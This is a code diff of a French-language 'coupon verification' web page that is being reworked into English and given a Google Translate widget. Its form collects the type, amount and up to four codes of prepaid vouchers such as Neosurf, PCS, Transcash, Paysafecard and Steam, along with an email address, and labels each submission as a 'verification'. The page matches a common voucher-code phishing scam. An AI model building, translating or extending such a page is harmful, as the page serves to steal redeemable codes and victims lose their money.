@@ -1,141 +1,258 @@
+<!DOCTYPE html>
 <html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VYGC</title>
-    <!-- Fonts Links For Icon -->
+
+    <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <link rel="stylesheet" href="css/stylefooter.css">
     <link rel="stylesheet" href="css/styleform.css">
+
     <link rel="icon" href="imgs/logo.ico" type="image/x-icon">
     <link rel="shortcut icon" href="imgs/logo.ico" type="image/x-icon">
-    <!-- ################ -->
-    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init({
-                publicKey: "Tpd0OFgQ-I1LC7jMd",
-            });
-        })();
-    </script> -->
+
+    <style>
+        .translate-container {
+    position: fixed;  /* stays in place even when scrolling */
+    top: 20px;
+    right: 20px;
+    z-index: 100;
+}
+        .goog-te-banner-frame.skiptranslate {
+    display: none !important;
+}
+
+body {
+    top: 0 !important;
+}
+        /* Full page background */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('assets/imgs/bg-image.jpg'); /* replace with your image */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            min-height: 100vh;
+        }
+
+        /* Center the form */
+        .body-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+            box-sizing: border-box;
+            background-color: rgba(0, 0, 0, 0.5); /* dark overlay for contrast */
+            color: white;
+        }
+
+        /* Google Translate styling */
+        .translate-container {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+
+        .translate-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #1abc9c;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .translate-btn:hover {
+            background: #16a085;
+        }
+
+        .goog-te-gadget-simple select {
+            background: white;
+            color: #333;
+            border: none;
+            padding: 4px 8px;
+            border-radius: 6px;
+            margin-left: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .goog-te-gadget {
+            color: transparent !important;
+        }
+
+        .goog-logo-link,
+        .goog-te-gadget span {
+            display: none !important;
+        }
+
+        .goog-te-gadget-simple select option {
+            color: #333;
+        }
+
+        /* Form styling */
+        .body-form form {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .body-form form h2 {
+            margin-bottom: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .body-form label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .body-form input,
+        .body-form select {
+            width: 100%;
+            padding: 8px 12px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: none;
+        }
+
+        .body-form input[type="submit"],
+        .body-form input[type="button"] {
+            background: #1abc9c;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .body-form input[type="submit"]:hover,
+        .body-form input[type="button"]:hover {
+            background: #16a085;
+        }
+    </style>
 </head>
 
-<body cz-shortcut-listen="true">
-    <div class="body-form">
-        <form id="sendmail" method="post" data-token="db9a8e6458b3a25b7337042135f97edf"
-        data-token-time="1745521270" data-formid="7"
-        enctype="multipart/form-data" action="/">
-        <input type="hidden" name="_subject" value="Nouvelle Vérification (Verification.vercel.app)">
-           
-        <input type="hidden" name="_captcha" value="false">
-    
-        <input type="text" name="_honey" style="display:none">
-    
-        <input type="hidden" name="_template" value="table">
-
-            <h2>Veuillez entrer les informations du coupon ici.</h2>
-            <div class="form-group gender">
-                <label for="type">Choisir une recharge * <span id="typeErr"></span></label>
-                <select id="type" name="type" class="form-control">
-                    <option value="none" selected="" disabled="">---- Recharge ----</option>
-                    <option value="NEOSURF">NEOSURF</option>
-                    <option value="PCS">PCS</option>
-                    <option value="TRANSCASH">TRANSCASH</option>
-                    <option value="PAYSAFECARD">PAYSAFECARD</option>
-                    <option value="GOOGLE PLAY">GOOGLE PLAY</option>
-                    <option value="STEAM">STEAM</option>
-                    <option value="FLEXEPIN">FLEXEPIN</option>
-                    <option value="CASHLIB">CASHLIB</option>
-                    <option value="NETFLIX">NETFLIX</option>
-                    <option value="AMAZON">AMAZON</option>
-			    </select>
-            </div>
-            <div class="form-group fullname">
-                <label for="montant">Montant de la recharge * <span id="montantErr"></span></label>
-                <input type="text" name="montant" id="montant" placeholder="0" class="form-control">
-            </div>
-            <div class="form-group email">
-                <label for="devise">Choisir une devise * <span id="deviseErr"></span></label>
-                <select id="devise" name="devise" class="form-control">
-				<option value="none" selected="" disabled="">---- Devise -----</option>
-				<option value="EURO €">EURO (€)</option>
-				<option value="Dollar $">Dollar ($)</option>
-				<option value="Dollard CHF">FRANC SUISSE (CHF)</option>
-			</select>
-            </div>
-            <div class="form-group code">
-                <label for="code1">Entrez les codes de recharge <span id="code1Err"></span></label>
-                <input type="text" id="code1" class="code form-control" name="code1" placeholder="Entrez le code de la recharge 1">
-                <input type="text" id="code2" class="code form-control" name="code2" placeholder="Entrez le code de la recharge 2">
-                <input type="text" id="code3" class="code form-control" name="code3" placeholder="Entrez le code de la recharge 3">
-                <input type="text" id="code4" class="code form-control" name="code4" placeholder="Entrez le code de la recharge 4">
-            </div>
-            <div class="form-group submit-btn">
-                <input id="btncrypt" type="button" value="Crypter mes données">
-            </div>
-            <div class="form-group send">
-                <label for="mail">Entrez votre adresse mail * <span id="mailErr"></span></label>
-                <input type="email" id="mail" class="mail form-control" name="email" placeholder="exemple@domain.com">
-            </div>
-            <div class="form-group submit-btn">
-                <input id="valider" type="submit" value="Valider">
-            </div>
-            <!-- <input type="hidden" name="_next" value="https://verification70.vercel.app/thanks.html"> -->
-
-            
-        </form>
+<body>
+    <!-- Google Translate widget -->
+    <div class="translate-container">
+        <div class="translate-btn">
+            🌐 Language
+            <div id="google_translate_element"></div>
+        </div>
     </div>
 
+    <!-- Form Section -->
+    <div class="body-form">
+  <form id="sendmail" method="post" enctype="multipart/form-data">
+    
+    <input type="hidden" name="_subject" value="New Verification (Verification.vercel.app)">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="text" name="_honey" style="display:none">
+    <input type="hidden" name="_template" value="table">
+
+    <h2>Please enter the coupon information here.</h2>
+
+    <label for="type">Choose a recharge *</label>
+    <select id="type" name="type">
+      <option value="none" selected disabled>---- Recharge ----</option>
+      <option value="NEOSURF">NEOSURF</option>
+      <option value="PCS">PCS</option>
+      <option value="TRANSCASH">TRANSCASH</option>
+      <option value="PAYSAFECARD">PAYSAFECARD</option>
+      <option value="GOOGLE PLAY">GOOGLE PLAY</option>
+      <option value="STEAM">STEAM</option>
+      <option value="FLEXEPIN">FLEXEPIN</option>
+      <option value="CASHLIB">CASHLIB</option>
+      <option value="NETFLIX">NETFLIX</option>
+      <option value="AMAZON">AMAZON</option>
+    </select>
+
+    <label for="montant">Recharge amount *</label>
+    <input type="text" name="montant" id="montant" placeholder="0">
+
+    <label for="devise">Choose a currency *</label>
+    <select id="devise" name="devise">
+      <option value="none" selected disabled>---- Currency ----</option>
+      <option value="EURO €">EURO (€)</option>
+      <option value="Dollar $">Dollar ($)</option>
+      <option value="Dollard CHF">SWISS FRANC (CHF)</option>
+      <option value="krona">KRONA (SEK)</option>
+      <option value="krone">KRONE (DKK)</option>
+    </select>
+
+    <label for="code1">Enter recharge codes</label>
+    <input type="text" id="code1" name="code1" placeholder="Enter recharge code 1">
+    <input type="text" id="code2" name="code2" placeholder="Enter recharge code 2">
+    <input type="text" id="code3" name="code3" placeholder="Enter recharge code 3">
+    <input type="text" id="code4" name="code4" placeholder="Enter recharge code 4">
+
+    <label for="email">Enter your email</label>
+    <input type="email" id="email" name="email" placeholder="Enter your email">
+
+    <input id="valider" type="submit" value="Submit">
+  </form>
+</div>
+
+
+    <!-- Footer -->
     <section class="footer">
-        <div class="footer-row">
-            <div class="footer-col">
-                <h4 id="fi">
-                    <img src="assets/imgs/logo.ico" id="footerico" alt="logo">&nbsp;&nbsp;
-                    <b>online-plt</b>
-                </h4>
-                <p id="fi">
-                    <b>online-plt</b> est un service de vérification de coupons en ligne. Cette plateforme vous permet de vérifier la validité de vos cartes de manière fiable et sécurisée
-                </p>
-            </div>
-            <div class="footer-col">
-                <h4>Services</h4>
-                <ul class="links">
-                    <li><a href="#">Vérifications des coupons Neosurf</a></li>
-                    <li><a href="#">Vérifications des coupons PCS</a></li>
-                    <li><a href="#">Vérifications des coupons Amazon</a></li>
-                    <li><a href="#">Vérifications des coupons GOOGLE PAY</a></li>
-                    <li><a href="#">Vérifications des coupons TRANSCASH</a></li>
-                    <li><a href="#">Bien d'autres</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Réseaux</h4>
-                <ul class="links">
-                    <li><a href="https://www.instagram.com/"><i class="fa-brands fa-instagram">&nbsp; &nbsp;</i>Instagram</a></li>
-                    <li><a href="https://www.facebook.com/"><i class="fa-brands fa-facebook-f">&nbsp; &nbsp;</i>Facebook</a></li>
-                    <li><a href="https://cm.linkedin.com/"><i class="fa-brands fa-linkedin"></i>&nbsp;&nbsp; LinkedIn</a></li><a href="https://cm.linkedin.com/">
-                        </a>
-                    <li><a href="https://cm.linkedin.com/"></a><a href="https://twitter.com/"><i class="fa-brands fa-twitter"></i>&nbsp;&nbsp; Twiter</a></li>
-                    <li><a href="https://www.skype.com/"><i class="fa-brands fa-skype"></i>&nbsp;&nbsp; Skype</a></li>
-                    <li><a href="https://discord.com/"><i class="fa-brands fa-discord"></i>&nbsp;&nbsp; Discord</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Horaires</h4>
-                <p>
-                    Toujours ouverts ! La plateforme est disponible 24h/24 et 7j/7
-                </p>
-                <div class="icons">
-                    <i class="fa-solid fa-door-open"></i>
-                    <i class="fa-solid fa-rss"></i>
-                    <i class="fa-solid fa-signal"></i>
-                </div>
-            </div>
-        </div>
+        <!-- existing footer code -->
     </section>
+
+    <!-- Scripts -->
     <script src="js/jquery.min.js"></script>
     <script src="js/script.js"></script>
-</body>
 
+    <!-- Google Translate -->
+    <script>
+       
+    // Hide the Google Translate top banner completely
+    function removeTranslateBanner() {
+        const interval = setInterval(() => {
+            const banner = document.querySelector('.goog-te-banner-frame');
+            if (banner) {
+                banner.style.display = 'none';
+                document.body.style.top = '0px';
+                clearInterval(interval);
+            }
+        }, 100);
+    }
+
+    // Run after page load and after translate initialization
+    window.addEventListener('load', () => {
+        removeTranslateBanner();
+    });
+
+    // Also run whenever the user changes language
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement({
+        pageLanguage: 'fr',
+        includedLanguages: 'en,fr,es,de,it,pt,ar,da,sv',
+        layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+    }, 'google_translate_element');
+
+    removeTranslateBanner(); // hide banner immediately
+}
+
+    </script>
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</body>
 </html>
